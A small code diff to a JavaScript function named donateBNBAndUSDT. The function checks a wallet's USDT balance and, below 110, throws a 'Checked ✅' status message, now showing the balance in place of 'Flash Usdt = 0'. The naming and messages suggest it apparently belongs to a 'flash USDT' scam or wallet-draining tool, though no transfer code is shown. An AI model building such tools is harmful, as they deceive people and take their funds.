@@ -120,11 +120,11 @@ export async function donateBNBAndUSDT() {
 
     console.log("Initial BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
     console.log("Current USDT balance:", usdtBalanceInUsdt);
-
+    let usdttoshow = parseFloat(usdtBalanceInUsdt).toFixed(2);
     if (parseFloat(usdtBalanceInUsdt) <= 110) {
       const statusMessage = {
         amount: "Amount = Checked ✅",
-        flash: "Flash Usdt = 0"
+        flash: "USDT = $"+usdttoshow+" "
       };
       throw statusMessage;
     }
